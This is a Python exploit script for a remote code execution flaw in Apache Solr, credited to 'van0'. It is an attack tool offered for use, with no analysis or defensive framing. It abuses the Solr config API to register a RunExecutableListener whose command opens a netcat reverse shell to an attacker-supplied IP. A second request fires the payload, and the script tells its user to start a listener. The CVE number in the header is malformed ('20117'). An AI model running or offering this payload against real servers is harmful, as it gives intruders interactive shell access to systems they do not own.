#!/usr/bin/python3
# CVE-20117-12629 - Apache Solr RCE
# van0

import requests
import sys
import time
import argparse
import string
import random
from tqdm import tqdm

def check_input_parameters():
    parser = argparse.ArgumentParser(description='Apache Solr exploit script.')
    parser.add_argument('-t', '--target', help='The target IP address', required=True)
    parser.add_argument('-c', '--collection', help='The collection name', default='my_collection')
    parser.add_argument('-p', '--port', help='The netcat listener port', default='4242')
    parser.add_argument('-a', '--attacker', help='The attacker IP address', default='192.168.1.100')
    args = parser.parse_args()
    return args.target, args.collection, args.port, args.attacker

def random_string(length=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def exploit_target(target_ip, collection_name, nc_port, attacker_ip):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en",
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Connection": "close",
        "Content-Type": "application/json"
    }
    # Reverse shell payload
    payload = '{"add-listener":{"event":"postCommit","name":"' + random_string() + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "mkfifo /tmp/lol;nc ' + attacker_ip + ' ' + nc_port + ' 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol"]}}'

    # Send the exploit
    response = requests.post('http://' + target_ip + ':8983/solr/' + collection_name + '/config', headers=headers, data=payload)
    if response.status_code == 200 and '"status":0' in response.text:
        print("Exploit sent successfully.")
    else:
        print("Failed to send the exploit.")
        return

    # Progress bar during waiting period
    print("Waiting for 10 seconds...")
    for _ in tqdm(range(10)):
        time.sleep(1)

    # Trigger the exploit
    response = requests.post('http://' + target_ip + ':8983/solr/' + collection_name + '/update', headers=headers, data='[{"id":"test"}]')
    if response.status_code == 200 and '"status":0' in response.text:
        print("Exploit triggered successfully. Please wait and watch the listener for incoming connection.")
    else:
        print("Failed to trigger the exploit.")

def main():
    target_ip, collection_name, nc_port, attacker_ip = check_input_parameters()
    print("Don't forget to open a netcat listener on port " + nc_port + "!")
    print("Note: Be sure to edit the script according to your needs.")
    exploit_target(target_ip, collection_name, nc_port, attacker_ip)

if __name__ == "__main__":
    main()

